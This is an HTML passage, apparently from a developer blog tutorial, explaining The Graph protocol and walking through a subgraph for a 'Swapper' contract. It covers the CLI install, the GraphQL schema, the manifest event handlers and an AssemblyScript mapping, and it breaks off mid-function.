url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEY0lEQVQ4y11Ta0zTdxQ9fWLlWaC0QikPKaUUyAoUyqOlFCgUy9PKo4UKCBSIvDYY+EQFRETRRcExJ4gmTI1zRpaMzcS4D4uOT27LPmy6OLdENt+bMUuQ9C5/UDe8yf2dm5Pcc+/N714AABGt8vwi65u4b+9Q6+7dg9t6evuaVjgXTHlWvJ33xl4TV69eQ3GpDc0tHWjv3MEaGh7DV19eF5dV1D3PyS0ks8X68Mj4WaG52IbSsmrWt/M/rMp3uVwrwkuvgndnLrJr2nvwyewlbKltZrW1dqGsom4iK7eUAoIif8ktKKdMU8HJ45PnsG/0JIsRszucmJqe4QwOHWbdX/gDi4uLwP1Hz/mXL1zh7flmHiMTk3jy9Jn77dt3/JiEAGlUCkfg31jb0KoMVWi2rPXwabx392cPIvImcnkzjXx2+XNMn5nBx5Nn2U+fPVtuOYzx/q9vJIxdve6WkKCL0KZm29/r2s6zOxoxOztXPDB4aKGtvatCb8hF7/a9bhptZpUmOTOcwxfi4qdXSm7cnE8lItWLFy/80D9xy6/7g8kLG+u3ukz5VjVTNSunSDyw/xA+OnnaMXzwKDmbOsheXU81dc7G6s1NyDBapJr0PBRbHU3NW7to+67+OyOjxxREtAbldcdqzYWOxzp97m/KuLQ43hpf9A+MYGj4aMbokTHq2zNE9Q2ti+WVNeSocdJGa3WevaoeiSk5SNHnj8eo0ydM+da5qFhtbWGpHTDn9NQmp1quxSZm/OTjL7WYNb7semcHqmpabN29e+jAwaNLW9u6XVWOxpelmxykNxY4EjVpkMnjERmbNh4aqb70TlLm+fVKTbNEFg0YEp11YRGaH30CgrZxOHyTm5tAqMsuhtFcZk1KM1F1bcuSo6bZZcgqWIqO01KYPHYHAAkPEKwLi8sWiqQOmVz9vShI0R4gUwHJSrvI00tiALD8swfGLnCVKi2iE7IqZfJ4kqs0pE3PfRkcrlqSRcSRvyR0BkBSaFhUsTYlqxDgQxSstAk8/XS+6yKAaEkpeHy/V2vuwSqp24VA3WaEx+r9I2JSh2Vy9RNFbAqJpREkFElvAehSREaWpKQnKibPnF7X0bmLG63OAN9dBN9AJVadTWBMDt7vG9XZ2gZ2EpE7w5kKqxPEMtV5gbvXFBtobW7rnZo+e+7vkeETX4wOnhcTEc9ssXHB8WK9Ph3e48dPmV2U7+/b2WXtOEHq4zepvKXzrso3SCoPVkASHo+wcBUaKp1eLd37qOfQKSqv6CSD0XKKiARDwx9yX58fI7jm13u/exIRO1WfrzZabNc22JyUqsu+6+HtFyeRBEKuSuIyxYUhGrf1UeoKQ3bRd5Kg0AUW161sQ8kmeIpCWCEhISvTMs+DB4+WUW8sWEahpzgeHIEPIzJ15hz7yV//4PLsHIuIWGJpJMAXBQNQ4H9mMGT+J/jng4fLmGEsZDPo7xMIcNciRJHE8CyXy8VhEAiGXJXMAdsHbxubw10W/BfaveLIwZfrMQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"subgraph\"\n        title=\"subgraph\"\n        src=\"/static/8b2d9ae8f52f2acb6e050c56ca1911de/37523/subgraph.png\"\n        srcset=\"/static/8b2d9ae8f52f2acb6e050c56ca1911de/e9ff0/subgraph.png 180w,\n/static/8b2d9ae8f52f2acb6e050c56ca1911de/f21e7/subgraph.png 360w,\n/static/8b2d9ae8f52f2acb6e050c56ca1911de/37523/subgraph.png 720w,\n/static/8b2d9ae8f52f2acb6e050c56ca1911de/1e088/subgraph.png 840w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Data flow after the <code class=\"language-text\">subgraph manifest</code> that handles Ethereum transactions is deployed</li>\n</ul>\n<ol>\n<li>dApps add data to Ethereum through smart contract transactions</li>\n<li>A smart contract generates one or more events while processing a transaction.</li>\n<li>Graph nodes are constantly searching for new blocks in Ethereum and the data of subgraphs they can contain.</li>\n<li>The graph node finds Ethereum events for the subgraph in this block and executes the mapping handler provided.</li>\n<li>Mapping is a WASM module that creates or updates data entities that graph nodes store in response to Ethereum events.</li>\n<li>The dApp uses the node’s GraphQL endpoint to query the graph node for indexed data on the blockchain.</li>\n<li>The graph node uses the indexing capabilities of the repository to fetch this data by converting the GraphQL query into a query for the underlying data store.</li>\n<li>The dApp will display this data in a rich UI for the end users, who will use this data to issue new transactions in Ethereum.</li>\n</ol>\n<h1 id=\"graph-network\" style=\"position:relative;\"><a href=\"#graph-network\" aria-label=\"graph network permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Graph Network</h1>\n<ul>\n<li>\n<p>The network is a decentralized indexing protocol for organizing blockchain data.</p>\n</li>\n<li>\n<p>Applications use GraphQL to query an open API called a subgraph to retrieve indexed data from the network.</p>\n</li>\n<li>\n<p>Graph allows developers to build serverless applications that run on completely public infrastructure.</p>\n</li>\n<li>\n<p>Graph networks provide services in the network</p>\n<ul>\n<li>Indexers that provide data to Web3 applications</li>\n<li>Curator</li>\n<li>Delegator</li>\n<li>Consumers use applications and consume data</li>\n</ul>\n</li>\n<li>\n<p>Participants stake and use Graph Token (GRT) to ensure the economic security of the graph network and the integrity of the data being queried.</p>\n</li>\n<li>\n<p>GRT is a work token that is ERC-20 on the Ethereum blockchain.</p>\n</li>\n<li>\n<p>Used to allocate resources on the network</p>\n</li>\n<li>\n<p>Halseong Indexer</p>\n</li>\n<li>\n<p>Curator</p>\n</li>\n<li>\n<p>Delegators can provide services and earn income on the network in proportion to the amount of work they perform and their stake in GRT.</p>\n</li>\n</ul>\n<hr>\n<h1 id=\"quick-start\" style=\"position:relative;\"><a href=\"#quick-start\" aria-label=\"quick start permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Quick Start</h1>\n<ul>\n<li>Subgraph Studio - Etheruem mainnet indexing</li>\n<li>Hosting Service\n<ul>\n<li>Etheruem mainnet ↔ External Network (ex.. Binance, Matic..)</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"subgraph-studio\" style=\"position:relative;\"><a href=\"#subgraph-studio\" aria-label=\"subgraph studio permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Subgraph Studio</h1>\n<h2 id=\"graph-cli-install\" style=\"position:relative;\"><a href=\"#graph-cli-install\" aria-label=\"graph cli install permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Graph CLI install</h2>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\">npm<span class=\"token punctuation\">,</span> install <span class=\"token operator\">-</span>g @graphprotocol<span class=\"token operator\">/</span>graph<span class=\"token operator\">-</span>cli</code></pre></div>\n<h2 id=\"subgraph-init\" style=\"position:relative;\"><a href=\"#subgraph-init\" aria-label=\"subgraph init permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>subgraph init</h2>\n<div class=\"gatsby-highlight\" data-language=\"jsx\"><pre class=\"language-jsx\"><code class=\"language-jsx\">graph init <span class=\"token operator\">--</span>studio <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">SUBGRAPH_SLUG</span></span><span class=\"token punctuation\">></span></span></code></pre></div>\n<h2 id=\"subgraph-writer\" style=\"position:relative;\"><a href=\"#subgraph-writer\" aria-label=\"subgraph writer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>subgraph writer</h2>\n<ul>\n<li>Subgraph construction work</li>\n<li>Manifest (subgraph.yaml)\n<ul>\n<li>Define the data sources the subgraph will index</li>\n</ul>\n</li>\n<li>Schema (schema.graphql)\n<ul>\n<li>The GraphQL schema defines the data you want to retrieve from the subgraph.</li>\n</ul>\n</li>\n<li>AssemblyScript (mapping.ts)\n<ul>\n<li>Code that converts to entities defined in the data schema of the data source</li>\n</ul>\n</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAABYlAAAWJQFJUiTwAAABaklEQVQ4y52RXW/bIBSG4QAGDAbj2STBaTol69ZKuZy2///L3gnaVFvUSfMuHvGp57wHWDpMmB9miNnBphGSBDgRmBDgQoIrCS4lGGP/xvnpjJ/ff+DL01fkc8H6+YTdvAMNHiz2YGKDrLI+FFyvV7x8e0bcT7CnBJ8dVBSgxEGeg4IAWQIxAvFX/iosZY/L5dKwi4XZaZilYl7X2TTaPGmYZKBHDeEFmGVghoE5Bta9CZ13iDE22ibdVeR38xv1nvhtvN3zwSMvGTln5DljjOO2N7tn/DTiuB7x+HhCKQWlHGCNaYec+HbhlCesxyP2h4J92SGEiD56SKugpAIRbRN2SUH5HiQchCcwSWDc/H/Lrnew1r5vCKIGvSGl3JZSKYX608YYaKMxhNB+PKUE7z201ui6bkPLqoPuNIQQaHLnGsMw/JH8Buf8nQ+FcRkxrRPmeWlpQggtWd/3jVuBKq9J61i7qWcfSX8BtukVl6AZxbgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"graph init\"\n        title=\"graph init\"\n        src=\"/static/cc8ae53c9b6987a89e9c0680bb15cb54/37523/graph-init.png\"\n        srcset=\"/static/cc8ae53c9b6987a89e9c0680bb15cb54/e9ff0/graph-init.png 180w,\n/static/cc8ae53c9b6987a89e9c0680bb15cb54/f21e7/graph-init.png 360w,\n/static/cc8ae53c9b6987a89e9c0680bb15cb54/37523/graph-init.png 720w,\n/static/cc8ae53c9b6987a89e9c0680bb15cb54/302a4/graph-init.png 1080w,\n/static/cc8ae53c9b6987a89e9c0680bb15cb54/07a9c/graph-init.png 1440w,\n/static/cc8ae53c9b6987a89e9c0680bb15cb54/169e3/graph-init.png 1682w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"contract-event-data-query-matching-operation\" style=\"position:relative;\"><a href=\"#contract-event-data-query-matching-operation\" aria-label=\"contract event data query matching operation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Contract Event data query matching operation</h3>\n<ul>\n<li>After subgraph initialization, modify the generated <code class=\"language-text\">schema.graphql</code> file to develop GraphQl queries for the events of the contract that will collect events.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"graphql\"><pre class=\"language-graphql\"><code class=\"language-graphql\"><span class=\"token comment\"># Swapper Contract Receive</span>\n<span class=\"token keyword\">type</span> <span class=\"token class-name\">Receive</span> <span class=\"token directive function\">@entity</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token attr-name\">id</span><span class=\"token punctuation\">:</span> <span class=\"token scalar\">ID</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">address</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Bytes</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">balance</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">BigInt</span><span class=\"token operator\">!</span>\n  \n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\"># Swapper Event</span>\n<span class=\"token keyword\">type</span> <span class=\"token class-name\">StakeManagermentType</span> <span class=\"token directive function\">@entity</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token attr-name\">id</span><span class=\"token punctuation\">:</span> <span class=\"token scalar\">ID</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">sender</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Bytes</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">recipient</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Bytes</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">srcToken</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Bytes</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">destToken</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">Bytes</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">expectedAmount</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">BigInt</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">receivedAmount</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">BigInt</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">percent</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">BigInt</span><span class=\"token operator\">!</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\"># history area</span>\n<span class=\"token keyword\">enum</span> <span class=\"token class-name\">LogType</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token constant\">SWAP</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\"># Logging </span>\n<span class=\"token keyword\">type</span> <span class=\"token class-name\">Log</span> <span class=\"token directive function\">@entity</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token attr-name\">id</span><span class=\"token punctuation\">:</span> <span class=\"token scalar\">ID</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">logType</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">LogType</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">createAt</span><span class=\"token punctuation\">:</span> <span class=\"token class-name\">BigInt</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">tx</span><span class=\"token punctuation\">:</span> <span class=\"token scalar\">String</span><span class=\"token operator\">!</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\"># history event</span>\n<span class=\"token keyword\">type</span> <span class=\"token class-name\">History</span> <span class=\"token directive function\">@entity</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token attr-name\">id</span><span class=\"token punctuation\">:</span> <span class=\"token scalar\">ID</span><span class=\"token operator\">!</span>\n  <span class=\"token attr-name\">logs</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token class-name\">Log</span><span class=\"token operator\">!</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>The following is the schema structure written to query the events that occur in the <code class=\"language-text\">Swapper.sol</code> contract, and the event structure of the contract developed and deployed earlier is as follows.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">event</span> <span class=\"token function\">Received</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">event</span> <span class=\"token function\">Swap</span><span class=\"token punctuation\">(</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> sender<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> recipient<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span> srcToken<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">address</span> destToken<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> expectedAmount<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> receivedAmount<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span> percent\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>Because it exists on-chain, in order to generate the corresponding event, the event must be triggered by calling a method that performs the swap function.</li>\n<li>The <code class=\"language-text\">Received</code> event is triggered when an Ether exchange occurs when calling this contract externally, and it was added to collect who makes the exchange.</li>\n<li>The <code class=\"language-text\">Swap</code> event generates a corresponding event when the swap is finally completed through the <code class=\"language-text\">multiSwapExactInput</code> function. It was added to collect data such as who used this function and which token pair was used as a swap.</li>\n<li>If you return to the <code class=\"language-text\">schema.graphql</code> file again, you can check that the mapping has been performed according to the corresponding event type using the GraphQL syntax. In case of <code class=\"language-text\">Log</code> Type, it is added for transaction logging.</li>\n</ul>\n<h3 id=\"graphql-schema-handling-work-in-progress\" style=\"position:relative;\"><a href=\"#graphql-schema-handling-work-in-progress\" aria-label=\"graphql schema handling work in progress permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>GraphQL schema handling work in progress</h3>\n<ul>\n<li>If the schema design is complete, you will be able to verify that each handling function is implemented by referencing the information of each function against the built contract abi and parsing the values configured from each event keyword. You can check the signature mapped to <code class=\"language-text\">eventHandlers</code> in the <code class=\"language-text\">subgraph.yaml</code> file below.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token operator\">-</span> <span class=\"token keyword\">event</span><span class=\"token punctuation\">:</span> <span class=\"token function\">Received</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span>\nhandler<span class=\"token punctuation\">:</span> handleReceived\n<span class=\"token operator\">-</span> <span class=\"token keyword\">event</span><span class=\"token punctuation\">:</span> <span class=\"token function\">Swap</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">indexed</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">indexed</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span>\nhandler<span class=\"token punctuation\">:</span> handleSwap</code></pre></div>\n<ul>\n<li>Since this file is the role of the manifest, which is the area that Graph refers to for the first time, you need to define which event handler to use before proceeding with the work.</li>\n<li>If it is created, you can check the created file in the src directory with the contract name specified when it was first set. This file is defined as follows. It informs the vector where the event handling is located, and development should proceed after checking it.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">file<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>src<span class=\"token operator\">/</span><span class=\"token keyword\">mapping</span><span class=\"token punctuation\">.</span>ts</code></pre></div>\n<ul>\n<li>The functions specified as prefix handle play the role of handling the previously designed GraphQL schema. It parses various events that occur in a transaction into an object form and provides a reference.</li>\n<li>The important point is to execute the <code class=\"language-text\">graph codegen</code> command to transform the redesigned schema into a code that can be understood in the graph binary. Then <code class=\"language-text\">generated/schema</code> is generated and each keyword must be used as an entity.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> BigInt <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"@graphprotocol/graph-ts\"</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> evtHistoryPush <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"./utils\"</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>\n  Received <span class=\"token keyword\">as</span> EvtReceived<span class=\"token punctuation\">,</span>\n  Swap <span class=\"token keyword\">as</span> EvtSwap \n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"../generated/Swapper/Swapper\"</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Receive<span class=\"token punctuation\">,</span> Swap<span class=\"token punctuation\">,</span> Log<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"../generated/schema\"</span>\n\n<span class=\"token comment\">// - event: Received(address,uint256)</span>\n<span class=\"token comment\">// handler: handleReceived</span>\n<span class=\"token comment\">// - event: Swap(indexed address,indexed address,address,address,uint256,uint256,uint256)</span>\n<span class=\"token comment\">// handler: handleSwap</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">function</span> <span class=\"token function\">handleReceived</span><span class=\"token punctuation\">(</span>event<span class=\"token operator\">:</span> EvtReceived<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token keyword\">void</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> entity <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Receive</span><span class=\"token punctuation\">(</span>\n    <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>event<span class=\"token punctuation\">.</span>transaction<span class=\"token punctuation\">.</span>hash<span class=\"token punctuation\">.</span><span class=\"token function\">toHex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">-</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>event<span class=\"token punctuation\">.</span>logIndex<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span>\n  <span class=\"token punctuation\">)</span>\n  entity<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>param0\n  entity<span class=\"token punctuation\">.</span>balance <span class=\"token operator\">=</span> event<span class=\"token punctuation\">.</span>params<span class=\"token punctuation\">.</span>param1\n  entity<span class=\"token punctuation\">.</span><span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n  <span class=\"token function\">logReceived</span><span class=\"token punctuation\">(</span>entity<span class=\"token punctuation\">.</span>id<span class=\"token punctuation\">,</span> event<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">function</span> <span class=\"token function\">logReceived</span><span class=\"token punctuation\">(</span>IDs<span class=\"token operator\">:</span> <span class=\"token builtin\">string</span><span class=\"token punctuation\">,</span> event<span class=\"token operator\">:</span> EvtReceived<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> <span class=\"token keyword\">void</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> log <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Log</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>event<span class=\"token punctuation\">.</span>transaction<span class=\"token punctuation\">.</span>hash<span class=\"token punctuation\">.</span><span class=\"token function\">toHex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token string\">-</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span>event<span class=\"token punctuation\">.</span>logIndex<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token interpolation-punctuation punctuation\">}</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span>\n\n  log<span class=\"token punctuation\">.</span>logType <span class=\"token operator\">=</span> 